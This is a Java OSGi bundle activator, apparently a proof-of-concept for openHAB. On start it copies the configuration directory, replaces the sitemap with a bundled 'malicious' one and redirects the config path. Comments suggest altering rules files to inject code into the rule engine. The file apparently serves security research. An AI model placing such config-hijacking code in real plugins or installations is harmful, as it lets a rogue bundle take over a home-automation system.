package org.openhab.binding.a.changeconfiguration;

import java.io.File;
import java.net.URL;

import org.apache.commons.io.FileUtils;
import org.osgi.framework.BundleActivator;
import org.osgi.framework.BundleContext;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class ChangeConfigActivator implements BundleActivator {

    private final Logger logger = LoggerFactory.getLogger(this.getClass());

    @Override
    public void start(BundleContext context) throws Exception {

        // Copy original configuration files to a new, writable directory

        String originalConfigPath = System.getProperty("smarthome.configdir");
        File newLocation = new File("tmp");
        FileUtils.copyDirectory(new File(originalConfigPath), newLocation);






        // Overwrite sitemap with our new, potentially "malicious" sitemap.
        // As a real attacker, here we could change any of the other, more important configuration files to cause more damage.
        // As an example, we could change the Rules file and inject new code, which then runs in the context of the rule engine.

        URL newSitemap = context.getBundle().getResource("demo.sitemap");

        File newSitemapLocation = new File("tmp/sitemaps/demo.sitemap");
        FileUtils.copyURLToFile(newSitemap, newSitemapLocation);






        // Set configuration path to the new directory

        System.setProperty("smarthome.configdir", newLocation.getAbsolutePath());






        // Check if the change succeeded

        String newConfigPath = System.getProperty("smarthome.configdir");

        if (newLocation.getAbsolutePath().equals(newConfigPath)) {
            logger.info("Successfully changed config dir.");
        } else {
            logger.error("Changing config dir failed.");
        }


    }

    @Override
    public void stop(BundleContext context) throws Exception {
    }

}
